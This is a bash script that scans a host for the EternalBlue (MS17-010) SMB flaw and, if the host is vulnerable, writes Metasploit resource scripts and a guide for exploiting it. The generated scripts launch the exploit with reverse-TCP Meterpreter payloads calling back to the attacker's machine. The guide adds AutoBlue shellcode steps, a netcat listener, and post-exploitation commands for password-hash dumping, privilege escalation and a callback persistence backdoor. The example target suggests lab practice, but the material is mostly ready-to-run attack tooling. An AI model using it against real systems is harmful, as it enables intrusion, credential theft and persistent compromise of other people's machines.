#!/bin/bash

#############################################
# EternalBlue (MS17-010) Detection & Setup
# Checks for vulnerability and prepares exploitation
# Author: Braxton
# Usage: ./eternalblue_check.sh <target_ip>
#############################################

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}"
echo "================================================"
echo "    EternalBlue (MS17-010) Scanner"
echo "================================================"
echo -e "${NC}"

# Check if target IP provided
if [ $# -eq 0 ]; then
    echo -e "${RED}[!] Usage: $0 <target_ip>${NC}"
    echo -e "${YELLOW}[*] Example: $0 10.10.10.40${NC}"
    exit 1
fi

TARGET=$1

# Validate IP format (basic check)
if ! [[ $TARGET =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    echo -e "${RED}[!] Invalid IP address format${NC}"
    exit 1
fi

echo -e "${YELLOW}[*] Target: ${NC}$TARGET"
echo -e "${YELLOW}[*] Starting MS17-010 vulnerability scan...${NC}"
echo ""

# Create output directory
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="eternalblue_${TARGET}_${TIMESTAMP}"
mkdir -p "$OUTPUT_DIR"

# Get LHOST (eth0 IP)
LHOST=$(ip -br a show eth0 2>/dev/null | awk '{print $3}' | cut -d'/' -f1)
if [ -z "$LHOST" ]; then
    echo -e "${YELLOW}[!] Could not detect eth0 IP, you'll need to set LHOST manually${NC}"
    LHOST="YOUR_IP"
fi

# Step 1: Quick nmap check for SMB
echo -e "${CYAN}[1/4] Checking if SMB (445) is open...${NC}"
if nmap -p 445 --open $TARGET | grep -q "445/tcp open"; then
    echo -e "${GREEN}[+] Port 445 (SMB) is open${NC}"
else
    echo -e "${RED}[!] Port 445 is not open or target is down${NC}"
    exit 1
fi
echo ""

# Step 2: Detect SMB version
echo -e "${CYAN}[2/4] Detecting SMB version...${NC}"
nmap -p 445 --script=smb-protocols $TARGET -oN "$OUTPUT_DIR/smb_version.txt"
SMB_VERSION=$(grep "SMBv1" "$OUTPUT_DIR/smb_version.txt" || echo "Unknown")
echo -e "${GREEN}[+] SMB information saved to: ${OUTPUT_DIR}/smb_version.txt${NC}"
echo ""

# Step 3: Check for MS17-010 vulnerability
echo -e "${CYAN}[3/4] Checking for MS17-010 (EternalBlue) vulnerability...${NC}"
nmap -p 445 --script=smb-vuln-ms17-010 $TARGET -oN "$OUTPUT_DIR/ms17-010_scan.txt"

# Parse results
if grep -q "VULNERABLE" "$OUTPUT_DIR/ms17-010_scan.txt"; then
    echo -e "${GREEN}"
    echo "================================================"
    echo "       ✓ TARGET IS VULNERABLE!"
    echo "================================================"
    echo -e "${NC}"
    echo -e "${GREEN}[+] MS17-010 (EternalBlue) vulnerability detected!${NC}"
    VULNERABLE=1
elif grep -q "likely VULNERABLE" "$OUTPUT_DIR/ms17-010_scan.txt"; then
    echo -e "${YELLOW}"
    echo "================================================"
    echo "       ⚠ TARGET LIKELY VULNERABLE"
    echo "================================================"
    echo -e "${NC}"
    echo -e "${YELLOW}[!] Target may be vulnerable (further testing needed)${NC}"
    VULNERABLE=1
else
    echo -e "${RED}[!] Target does not appear to be vulnerable to MS17-010${NC}"
    VULNERABLE=0
fi
echo ""

# Step 4: Create Metasploit resource script if vulnerable
if [ $VULNERABLE -eq 1 ]; then
    echo -e "${CYAN}[4/4] Generating Metasploit exploitation script...${NC}"
    
    cat > "$OUTPUT_DIR/exploit_eternalblue.rc" << EOF
# EternalBlue Exploitation Resource Script
# Target: $TARGET
# Generated: $(date)
# LHOST: $LHOST

# Set global variables
setg RHOSTS $TARGET
setg LHOST $LHOST

print_status "Starting EternalBlue exploitation workflow..."
print_line ""

# Step 1: Verify vulnerability with auxiliary scanner
print_good "Step 1: Verifying MS17-010 vulnerability"
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS $TARGET
run

print_line ""
print_line "If vulnerable, continuing with exploitation..."
print_line ""
sleep 2

# Step 2: Set up exploit
print_good "Step 2: Configuring EternalBlue exploit"
use exploit/windows/smb/ms17_010_eternalblue

# Target configuration
set RHOSTS $TARGET
set RPORT 445

# Payload configuration - x64 reverse TCP (most reliable)
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT 4444

# Exploit options
set MaxExploitAttempts 10
set GroomAllocations 13
set GroomDelta 5000

# Show configuration
print_line ""
print_good "Exploit Configuration:"
show options
print_line ""

# Ask for confirmation before exploitation
print_warning "Ready to exploit!"
print_line "Target: $TARGET"
print_line "Payload: windows/x64/meterpreter/reverse_tcp"
print_line "LHOST: $LHOST:4444"
print_line ""
print_warning "Press ENTER to launch exploit, or Ctrl+C to abort"
prompt = gets

# Launch exploit
print_good "Launching EternalBlue exploit..."
exploit -j

print_line ""
print_good "Exploit launched!"
print_line "If successful, you should receive a Meterpreter session"
print_line "Use 'sessions -i' to interact with active sessions"
print_line ""

# Wait and check for sessions
sleep 10
sessions -l
EOF

    echo -e "${GREEN}[+] Metasploit resource script created: ${OUTPUT_DIR}/exploit_eternalblue.rc${NC}"
    echo ""
    
    # Create alternative x86 payload script
    cat > "$OUTPUT_DIR/exploit_eternalblue_x86.rc" << EOF
# EternalBlue Exploitation Resource Script (x86 payload)
# Target: $TARGET
# Generated: $(date)
# Use this if x64 payload fails

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET
set RPORT 445
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT 4444
set MaxExploitAttempts 10
exploit -j
EOF

    echo -e "${GREEN}[+] Alternative x86 script created: ${OUTPUT_DIR}/exploit_eternalblue_x86.rc${NC}"
    echo ""
    
    # Create manual exploitation guide
    cat > "$OUTPUT_DIR/EXPLOITATION_GUIDE.txt" << EOF
========================================
EternalBlue Exploitation Guide
========================================
Target: $TARGET
Scan Date: $(date)
LHOST: $LHOST

VULNERABILITY STATUS: CONFIRMED
Target is vulnerable to MS17-010 (EternalBlue)

========================================
METHOD 1: Automated Exploitation
========================================

1. Start Metasploit with resource script:
   msfconsole -r exploit_eternalblue.rc

2. Wait for exploitation to complete
3. If successful, interact with session:
   sessions -i 1

========================================
METHOD 2: Manual Exploitation
========================================

1. Start msfconsole:
   msfconsole

2. Verify vulnerability:
   use auxiliary/scanner/smb/smb_ms17_010
   set RHOSTS $TARGET
   run

3. Configure exploit:
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS $TARGET
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST $LHOST
   set LPORT 4444
   exploit

4. If x64 fails, try x86:
   set PAYLOAD windows/meterpreter/reverse_tcp
   exploit

========================================
METHOD 3: Using AutoBlue-MS17-010
========================================

If Metasploit fails, try the AutoBlue Python exploit:

1. Clone AutoBlue:
   git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
   cd AutoBlue-MS17-010

2. Setup shellcode:
   cd shellcode
   ./shell_prep.sh
   # Enter: LHOST=$LHOST, LPORT=4444

3. Run eternal checker:
   cd ..
   python eternal_checker.py $TARGET

4. Run exploit:
   python eternalblue_exploit7.py $TARGET shellcode/sc_x64.bin

5. Setup listener:
   # In another terminal
   nc -nlvp 4444

========================================
TROUBLESHOOTING
========================================

If exploit fails:

1. Try different payload architectures (x64 vs x86)
2. Adjust GroomAllocations (try values: 12, 13, 14)
3. Try multiple times (exploit can be unreliable)
4. Ensure no other services on LPORT 4444
5. Check firewall rules (incoming connections)
6. Try alternative exploit: ms17_010_psexec
7. Use AutoBlue Python script as backup

========================================
POST-EXPLOITATION
========================================

Once you have a shell:

1. Check privileges:
   getuid
   getsystem

2. Check OS version:
   sysinfo

3. Dump hashes:
   hashdump

4. Migrate to stable process:
   ps
   migrate <PID>

5. Establish persistence:
   run persistence -X -i 10 -p 4445 -r $LHOST

6. Gather info:
   run post/windows/gather/enum_logged_on_users
   run post/windows/gather/checkvm
   run post/windows/gather/enum_applications

========================================
IMPORTANT NOTES
========================================

- EternalBlue can crash the target system
- Save your work frequently
- Migrate to a stable process ASAP
- Use getsystem to elevate to SYSTEM
- Target may require multiple exploitation attempts
- Keep notes of what works for reporting

========================================
EOF

    echo -e "${GREEN}[+] Exploitation guide created: ${OUTPUT_DIR}/EXPLOITATION_GUIDE.txt${NC}"
    echo ""
    
    # Summary with next steps
    echo -e "${BLUE}"
    echo "================================================"
    echo "              SCAN COMPLETE"
    echo "================================================"
    echo -e "${NC}"
    echo -e "${GREEN}✓ Target is vulnerable to EternalBlue!${NC}"
    echo ""
    echo -e "${YELLOW}Next Steps:${NC}"
    echo -e "  ${CYAN}1.${NC} Quick exploit:    ${GREEN}msfconsole -r $OUTPUT_DIR/exploit_eternalblue.rc${NC}"
    echo -e "  ${CYAN}2.${NC} Manual method:    ${GREEN}cat $OUTPUT_DIR/EXPLOITATION_GUIDE.txt${NC}"
    echo -e "  ${CYAN}3.${NC} Review scan:      ${GREEN}cat $OUTPUT_DIR/ms17-010_scan.txt${NC}"
    echo ""
    echo -e "${YELLOW}Alternative payloads available:${NC}"
    echo -e "  ${BLUE}→${NC} x86 version:      ${GREEN}msfconsole -r $OUTPUT_DIR/exploit_eternalblue_x86.rc${NC}"
    echo ""
    echo -e "${RED}⚠ Warning: EternalBlue can crash the target! Save your work first!${NC}"
    echo ""
else
    echo -e "${CYAN}[4/4] Target not vulnerable, skipping exploit generation${NC}"
    echo ""
    echo -e "${YELLOW}Alternative checks to perform:${NC}"
    echo -e "  • Check for other SMB vulnerabilities"
    echo -e "  • Try SMB enumeration: enum4linux -a $TARGET"
    echo -e "  • Check for null sessions"
    echo -e "  • Attempt SMB relay attacks"
fi

# Final output summary
echo -e "${BLUE}================================================${NC}"
echo -e "${GREEN}All results saved in: ${NC}$OUTPUT_DIR/"
echo -e "${BLUE}================================================${NC}"
